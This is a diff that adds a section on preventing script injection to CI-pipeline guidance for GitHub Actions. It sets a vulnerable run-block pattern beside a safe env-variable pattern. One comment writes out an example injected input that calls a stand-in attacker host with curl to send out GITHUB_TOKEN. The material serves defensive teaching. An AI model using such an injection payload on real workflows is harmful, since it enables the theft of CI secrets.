@@ -8,6 +8,48 @@ CI pipelines must execute tests reliably, quickly, and provide clear feedback. B
 
 CI is the quality gate for production. A poorly configured pipeline either wastes developer time (slow feedback, false positives) or ships broken code (false negatives, insufficient coverage). Burn-in testing ensures reliability by stress-testing changed code, while parallel execution and intelligent test selection optimize speed without sacrificing thoroughness.
 
+## Security: Script Injection Prevention
+
+**Rule:** NEVER use `${{ inputs.* }}` or user-controlled GitHub context directly in `run:` blocks. Always pass through `env:` and reference as `"$ENV_VAR"` (double-quoted).
+
+When CI templates are extended into reusable workflows (`on: workflow_call`), manual dispatch workflows (`on: workflow_dispatch`), or composite actions, `${{ inputs.* }}` values become user-controllable. Interpolating them directly in `run:` blocks enables shell command injection.
+
+### Vulnerable vs Safe Pattern
+
+```yaml
+# ❌ VULNERABLE — inputs.test_ids could contain: "; curl attacker.com/steal?t=$(cat $GITHUB_TOKEN)"
+- name: Run tests
+  run: |
+    npx playwright test --grep "${{ inputs.test_ids }}"
+
+# ✅ SAFE — env var cannot break out of shell quoting
+- name: Run tests
+  env:
+    TEST_IDS: ${{ inputs.test_ids }}
+  run: |
+    npx playwright test --grep "$TEST_IDS"
+```
+
+### Unsafe Contexts (require env: intermediary)
+
+- `${{ inputs.* }}` — workflow_call and workflow_dispatch inputs
+- `${{ github.event.* }}` — treat the entire event namespace as unsafe (PR titles, issue bodies, comment bodies, label names, etc.)
+- `${{ github.head_ref }}` — PR source branch name (user-controlled)
+
+**Important:** Passing through `env:` prevents GitHub expression injection, but inputs must still be treated as DATA, not COMMANDS. Never execute an input-derived env var as a shell command (e.g., `run: $CMD` where CMD came from an input). Use fixed commands and pass inputs only as quoted arguments.
+
+### Safe Contexts (safe from GitHub expression injection in run: blocks)
+
+- `${{ steps.*.outputs.* }}` — pre-computed by your own code
+- `${{ matrix.* }}` — defined in workflow YAML
+- `${{ runner.os }}`, `${{ github.sha }}`, `${{ github.ref }}` — system-controlled
+- `${{ secrets.* }}` — secret store, not user-injectable
+- `${{ env.* }}` — already an env var
+
+> **Note:** "Safe from expression injection" means these values cannot be manipulated by external actors to break out of `${{ }}` interpolation. Standard shell quoting practices still apply — always double-quote variable references in `run:` blocks.
+
+---
+
 ## Pattern Examples
 
 ### Example 1: GitHub Actions Workflow with Parallel Execution
